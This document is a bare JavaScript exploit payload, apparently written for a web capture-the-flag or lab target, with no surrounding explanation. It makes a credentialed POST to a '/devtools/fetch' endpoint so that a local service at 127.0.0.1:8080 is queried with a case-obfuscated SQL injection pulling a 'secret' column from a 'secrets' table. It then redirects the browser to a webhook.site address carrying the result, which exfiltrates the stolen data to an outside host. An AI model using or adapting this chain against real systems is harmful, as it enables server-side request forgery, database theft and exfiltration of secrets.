u='http://127.0.0.1:8080/search?q='%20UnIoN%20SeLeCt%201,secret,3,4%20FrOm%20secrets';
fetch('/devtools/fetch',{
 method:'POST',
 credentials:'include',
 body:'{"url":"'+u+'"}'
})
.then(r=>r.text())
.then(x=>location='https://webhook.site/8c62b06e-fc89-4a48-b546-c925fe959850?d='+encodeURIComponent(x))